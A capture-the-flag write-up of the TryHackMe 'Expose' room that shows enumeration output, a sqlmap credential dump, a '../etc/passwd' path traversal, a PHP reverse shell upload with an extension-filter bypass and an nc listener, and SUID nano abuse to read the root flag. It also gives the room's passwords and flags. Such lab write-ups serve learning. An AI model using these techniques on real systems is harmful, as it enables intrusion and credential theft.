@@ -1,0 +1,257 @@
+-----------------------EXPOSE ROOM TRYHACKME ----------------
+
+Link: https://tryhackme.com/room/expose
+DAte: 04/02/2025
+Dificulity: Easy
+Ip: 10.10.156.6
+
+
+
+======Port Enumeration =========
+nmapAutomator.sh --host 10.10.156.6 --type All
+
+Running all scans on 10.10.156.6
+
+Host is likely running Unknown OS!
+
+
+---------------------Starting Port Scan-----------------------
+
+
+
+PORT   STATE SERVICE
+21/tcp open  ftp --> Anonymous logon autorized
+22/tcp open  ssh
+53/tcp open  domain
+1337/tcp open  waste
+1883/tcp open  mqtt
+
+
+----Working on port 21
+ftp> ls -la
+229 Entering Extended Passive Mode (|||13771|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        121          4096 Jun 11  2023 .
+drwxr-xr-x    2 0        121          4096 Jun 11  2023 ..
+226 Directory send OK.
+ftp>
+
+
+Nothing on port 21.
+
+
+-------------Working on port 1337
+##Directory enumeration
+gobuster dir -u http://10.10.156.6:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100     
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.156.6:1337/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 317] [--> http://10.10.156.6:1337/admin/]
+/javascript           (Status: 301) [Size: 322] [--> http://10.10.156.6:1337/javascript/]
+/phpmyadmin           (Status: 301) [Size: 322] [--> http://10.10.156.6:1337/phpmyadmin/]
+
+
+I access to /admin page but nothing there. it have a login page but when i try to see the source code i don't see a form fieled. so i think i can't pass there to enter. 
+
+I access to phpmyadmin and i have access so i will try to see if i can found default credentiela to test.
+
+Nothing i will try using sqlmap with burpsuite. i will see if i found something.
+
+
+I come back after 3 hours and i decide to change the wordlist to do the enumeration and i found something new.
+
+gobuster dir -u http://10.10.207.96:1337/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x .php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.207.96:1337/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 279]
+/.htpasswd.php        (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.htaccess.php        (Status: 403) [Size: 279]
+/admin                (Status: 301) [Size: 319] [--> http://10.10.207.96:1337/admin/]
+/admin_101            (Status: 301) [Size: 323] [--> http://10.10.207.96:1337/admin_101/]
+/index.php            (Status: 200) [Size: 91]
+/javascript           (Status: 301) [Size: 324] [--> http://10.10.207.96:1337/javascript/]
+/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.207.96:1337/phpmyadmin/]
+/server-status        (Status: 403) [Size: 279]
+Progress: 40938 / 40940 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+When i access to the page admin_101 it has the same formualar as the admin page but it has a default email 
+
+Email : hacker@root.thm
+
+And it has a form behing . so i go on burp to save the request and lunch my sqlmap on it
+
+--> sqlmap -r sqlfile --dump
+
+##--waiting for the answer
+[1 entry]
++----+-----------------+---------------------+--------------------------------------+
+| id | email           | created             | password                             |
++----+-----------------+---------------------+--------------------------------------+
+| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
++----+-----------------+---------------------+--------------------------------------+
+
+[2 entries]
++----+------------------------------+-----------------------------------------------------+
+| id | url                          | password                                            |
++----+------------------------------+-----------------------------------------------------+
+| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
+| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
++----+------------------------------+-----------------------------------------------------+
+
+when i logged in i don't see something so i will go to /file1010111/index.php
+
+When i go there they ask me the password 
+
+Password : easytohack
+
+Message After putting the password : Parameter Fuzzing is also important :) or Can you hide DOM elements?
+
+Solution : i test some parametters like id ... and i noticed that file work
+
+http://10.10.149.83:1337/file1010111/index.php?file=../../../../../../etc/passwd
+
+in /etc/paswd we found this
+
+zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
+
+so we will check the second url : /upload-cv00101011/index.php
+
+Message : Please enter the password:
+Hint: It is the name of machine user starting with letter "z"
+
+so we have the username : zeamkish
+
+when we put the username we got a upload page with possibility to upload files. so i will uploas my php reverse shell
+
+Name_of_file : revshell.php
+
+i put the name as png to be upload it and i intercept it in burp and put the oiginal extension
+------WebKitFormBoundarylFm2YSrxQZ1dQHBw
+Content-Disposition: form-data; name="file"; filename="revshell.php"
+
+Message: File uploaded successfully! Maybe look in source code to see the path
+
+<h1>File uploaded successfully! Maybe look in source code to see the path<span style=" display: none;">in /upload_thm_1001 folder</span> <h1>
+
+we will access to it to see our shell. It is here http://10.10.128.20:1337/upload-cv00101011/upload_thm_1001/
+
+now prepare our listner with the command : nc -nvlp 1234  and click on our file 
+
+Listening on 0.0.0.0 1234
+Connection received on 10.10.128.20 54694
+Linux ip-10-10-128-20 5.15.0-1039-aws #44~20.04.1-Ubuntu SMP Thu Jun 22 12:21:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 10:31:10 up 11 min,  0 users,  load average: 0.05, 0.06, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$
+
+Now we will search for file with interesting informations.
+
+ww-data@ip-10-10-128-20:/home/zeamkish$ cat ssh_creds.txt
+cat ssh_creds.txt
+SSH CREDS
+zeamkish
+easytohack@123
+www-data@ip-10-10-128-20:/home/zeamkish$
+
+we have ssh credentials so we will use it to login.
+
+ssh zeamkish@10.10.128.20
+The authenticity of host '10.10.128.20 (10.10.128.20)' can't be established.
+ED25519 key fingerprint is SHA256:rRpORIgnCLzMfEv3y+UG0ol7vth+rXjtyBDQ2mqHGmw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.128.20' (ED25519) to the list of known hosts.
+zeamkish@10.10.128.20's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1039-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Feb  5 10:35:42 UTC 2025
+
+  System load:  0.0               Processes:             128
+  Usage of /:   7.2% of 58.09GB   Users logged in:       0
+  Memory usage: 17%               IPv4 address for eth0: 10.10.128.20
+  Swap usage:   0%
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sun Jul  2 17:27:46 2023 from 10.10.83.109
+zeamkish@ip-10-10-128-20:~$ cat flag.txt 
+THM{USER_FLAG_1231_EXPOSE}
+zeamkish@ip-10-10-128-20:~$ 
+
+To do priviliege escalation we try sudo -l but we have nothing
+
+let try find / -perm -u=s -type f 2> /dev/null 
+
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/nano
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/find
+/usr/bin/at
+/usr/bin/mount
+
+so we just read the file using nano 
+
+ /usr/bin/nano /root/flag.txt
+
+THM{ROOT_EXPOSED_1001}
+
+Thank you for reading my opinion of the room @petstar from togo
